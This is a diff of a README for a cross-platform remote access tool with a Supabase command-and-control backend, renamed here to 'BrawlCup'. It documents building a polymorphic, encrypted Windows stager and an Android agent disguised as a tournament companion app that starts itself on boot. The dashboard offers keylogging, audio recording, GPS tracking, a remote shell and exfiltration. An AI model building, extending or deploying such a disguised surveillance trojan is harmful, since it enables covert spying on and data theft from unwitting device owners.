@@ -1,90 +1,84 @@
-# Val-Tine V2
+# BrawlCup
 
-Cross-platform remote administration tool with a Supabase C2 backend. Targets Windows and Android with a React web dashboard for control.
+Cross-platform remote administration tool with a React web dashboard, Supabase C2 backend, and agents for Windows and Android.
 
 ```
 ┌──────────────┐     ┌──────────────┐     ┌──────────────┐
 │   Dashboard   │────▶│   Supabase   │◀────│    Agent     │
 │   (React)     │     │   (C2 API)   │     │  (Go binary) │
 └──────────────┘     └──────────────┘     └──────────────┘
-                           ▲
-                           │
-                     ┌─────┴─────┐
-                     │   Edge     │
-                     │ Functions  │
-                     └───────────┘
 ```
 
-**Windows Agent** — Go binary with a 4-stage polymorphic VM stager
-**Android Agent** — Go binary packaged as a native library inside a signed APK
-**Dashboard** — React + Vite web panel backed by Supabase (Postgres, REST API, Edge Functions, Storage)
+- **Windows Agent** — Go binary with polymorphic VM stager + dual-layer encryption
+- **Android Agent** — Go binary packaged as `libagent.so` inside a signed APK (BrawlCup branding)
+- **Dashboard** — React + Vite + Shadcn/UI web panel with real-time client management
 
 ---
 
-## Requirements
+## Quick Start
 
-| Dependency | Version | Purpose |
-|-----------|---------|---------|
-| [Python](https://python.org/) | 3.8+ | Setup wizard and build scripts |
-| [Go](https://go.dev/dl/) | 1.21+ | Agent compilation |
-| [Node.js](https://nodejs.org/) | 18+ | Supabase CLI and dashboard |
-| [Supabase CLI](https://supabase.com/docs/guides/cli) | latest | DB migrations and edge function deploys |
+Three steps to get running:
 
-**Additional for Android builds:**
+### 1. Install Dependencies
 
-| Dependency | Version | Purpose |
-|-----------|---------|---------|
-| [Java JDK](https://adoptium.net/) | 11+ | APK signing (`keytool`, `jarsigner`) |
-| [Gradle](https://gradle.org/install/) | 8.x | APK build system |
-| [Android SDK](https://developer.android.com/studio) | SDK 34 | Build tools, platform libraries |
+```bash
+npm install
+```
 
-> `setup.py` checks for missing dependencies at startup and can auto-install them using your system package manager (apt, dnf, pacman, brew, winget, choco).
+This installs all Node.js packages needed for the React dashboard (Vite, React, Supabase client, Shadcn/UI, etc).
 
----
-
-## Setup
+### 2. Run Setup
 
 ```bash
 python3 setup.py
 ```
 
-The setup wizard will:
-1. **Check dependencies** — detect missing tools and offer to install them
-2. **Collect config** — Supabase URL, anon key, optional secondary project, webhook URL
-3. **Create dashboard user** — Supabase Auth user for the web panel
-4. **Run Supabase CLI** — login, link project, push migrations, deploy edge functions
-5. **Build payloads** — optionally build Windows EXE and/or Android APK
+The setup wizard handles everything:
 
-After setup, start the dashboard:
+- **Checks system dependencies** — Go, Node.js, Java, Gradle, Android SDK (offers to auto-install missing ones)
+- **Collects Supabase config** — project URL, anon key, optional secondary project for redundancy
+- **Creates your dashboard login** — Supabase Auth user (email + password)
+- **Configures Supabase CLI** — logs in, links your project, pushes DB migrations, deploys edge functions
+- **Injects config** into agent source files and `.env`
+- **Builds payloads** (optional) — Windows EXE and/or Android APK
+
+> You can skip payload builds during setup and build them later. The dashboard works independently.
+
+### 3. Launch the Dashboard
 
 ```bash
-npm install
 npm run dev
 ```
 
-Open `http://localhost:5173` and log in.
+Open **http://localhost:5173** and log in with the credentials you created in step 2.
+
+That's it. The dashboard is live and will show connected agents in real time.
 
 ---
 
 ## Building Payloads
 
+Payloads can be built during `setup.py` or separately at any time.
+
 ### Windows
 
 ```bash
 python3 obfus.py
-# or rebuild quickly:
+```
+
+Polymorphic pipeline — every build produces a unique binary:
+1. Compile Go agent with injected C2 config
+2. Dual-layer encrypt (XOR + RC4)
+3. Generate randomized VM bytecode with unique opcodes
+4. Compile polymorphic Go stager to EXE
+
+To rebuild quickly:
+
+```bash
 python3 setup.py build
 ```
 
-4-stage polymorphic pipeline:
-1. Compile Go agent → dual-layer encrypt (XOR + RC4) → upload to temp hosting
-2. Shorten payload URL via Supabase edge function
-3. Generate polymorphic VM bytecode with randomized opcodes
-4. Generate polymorphic Go stager → compile to EXE
-
-Every build produces a unique binary with different opcodes, identifiers, encryption keys, and junk code.
-
-### Android
+### Android (BrawlCup APK)
 
 ```bash
 python3 build_android.py
@@ -101,23 +95,27 @@ python3 build_android.py --domain yourproject.supabase.co --apikey eyJ...
 | `--domain` | from `.env` | Primary Supabase domain |
 | `--domain2` | — | Secondary domain (redundancy) |
 | `--apikey` | from `.env` | Supabase anon key |
-| `--arch` | `arm64` | Target: `arm64`, `arm`, `x86_64`, `x86` |
+| `--arch` | `arm64,arm` | Target architectures (comma-separated) |
 | `--output` | `BrawlCup.apk` | Output filename |
 
-Build stages:
-1. Compile Go agent for `android/{arch}` with injected C2 config
-2. Package as `libagent.so` in APK via Gradle
-3. Sign with debug keystore + v2 apksigner
+The APK is branded as **BrawlCup** (tournament companion app) with:
+- Trophy icon and purple/gold theme
+- Full-screen permissions GUI explaining why each permission is needed
+- Auto-starts background service after permission grant
 
-Install: `adb install BrawlCup.apk`
+Install on device:
 
-> Set `ANDROID_HOME` env var or the builder auto-detects from `~/Android/Sdk`, `/usr/lib/android-sdk`, etc.
+```bash
+adb install BrawlCup.apk
+```
+
+> Requires Android SDK with NDK. Set `ANDROID_HOME` or the builder auto-detects common paths.
 
 ---
 
 ## Agent Commands
 
-### Common (Windows + Android)
+### Cross-Platform (Windows + Android)
 
 | Command | Description |
 |---------|-------------|
@@ -184,39 +182,83 @@ Install: `adb install BrawlCup.apk`
 
 ---
 
+## Dashboard Features
+
+- **Real-time client list** with online/idle/offline status indicators
+- **Tabbed client view**: System Info, Remote Shell, Surveillance, File Manager, Exfiltration, Control
+- **Remote shell** with terminal emulation and process manager
+- **File browser** with upload/download
+- **Surveillance**: screenshots, keylogger, audio recording, GPS tracking
+- **Batch commands** — broadcast to multiple clients at once
+- **Search and sorting** by status, machine name, OS, IP, admin level
+
+---
+
 ## Project Structure
 
 ```
-Val-Tine-V2/
-├── setup.py                # Setup wizard (config + dependency check + builds)
-├── obfus.py                # Windows polymorphic builder
-├── build_android.py        # Android APK builder
-├── main.go                 # Windows agent source
-├── .env                    # Supabase config (generated by setup.py)
-├── src/                    # React dashboard
+BrawlCup/
+├── setup.py                 # Setup wizard (config + deps + Supabase + builds)
+├── build_android.py         # Android APK builder
+├── obfus.py                 # Windows polymorphic builder
+├── main.go                  # Windows agent source
+├── package.json             # Node.js dependencies
+├── vite.config.ts           # Vite dev server config
+├── .env                     # Supabase config (generated by setup.py)
+│
+├── src/                     # React dashboard
+│   ├── App.tsx              # Router and auth guard
 │   ├── pages/
-│   │   ├── Dashboard.tsx
-│   │   └── Client.tsx
-│   ├── hooks/
-│   ├── lib/
-│   └── components/
-├── android/                # Android APK project
-│   ├── agent/main.go       # Android Go agent
+│   │   ├── Login.tsx        # Auth form
+│   │   ├── Dashboard.tsx    # Client list with real-time updates
+│   │   └── ClientDetail.tsx # Client control panel (tabbed)
+│   ├── components/
+│   │   ├── layout/          # App shell, sidebar, navbar
+│   │   └── client/          # Tab components (shell, files, surveillance, etc)
+│   ├── hooks/               # Auth, clients, mobile hooks
+│   └── lib/                 # Command dispatch, utilities
+│
+├── android/                 # Android APK project
+│   ├── agent/main.go        # Android Go agent
 │   ├── app/
-│   │   ├── build.gradle
+│   │   ├── build.gradle     # App config (com.brawlcup.app)
 │   │   └── src/main/
 │   │       ├── AndroidManifest.xml
-│   │       └── java/.../
-│   │           ├── MainActivity.java
-│   │           ├── AgentService.java
-│   │           └── BootReceiver.java
+│   │       ├── res/         # BrawlCup icon, colors, strings
+│   │       └── java/com/brawlcup/app/
+│   │           ├── MainActivity.java   # Permissions GUI
+│   │           ├── AgentService.java   # Foreground service
+│   │           └── BootReceiver.java   # Boot persistence
 │   ├── build.gradle
-│   ├── gradle/
 │   └── settings.gradle
-└── supabase/               # Migrations & edge functions
+│
+└── supabase/                # Database & edge functions
     ├── migrations/
+    │   ├── 01_schema.sql    # Tables: clients, commands, system_info, etc
+    │   └── 02_storage.sql   # Storage buckets & policies
     └── functions/
+        └── file-upload/     # File upload edge function
 ```
+
+---
+
+## Requirements
+
+| Dependency | Version | Purpose |
+|-----------|---------|---------|
+| [Node.js](https://nodejs.org/) | 18+ | Dashboard + Supabase CLI |
+| [Python](https://python.org/) | 3.8+ | Setup wizard and build scripts |
+| [Go](https://go.dev/dl/) | 1.21+ | Agent compilation |
+
+**Additional for Android builds:**
+
+| Dependency | Purpose |
+|-----------|---------|
+| [Java JDK](https://adoptium.net/) 11+ | APK signing |
+| [Gradle](https://gradle.org/install/) 8.x | APK build system |
+| [Android SDK + NDK](https://developer.android.com/studio) | Build tools & cross-compilation |
+
+> `setup.py` detects missing dependencies and can auto-install them via your system package manager (apt, dnf, pacman, brew, winget, choco).
 
 ---
 
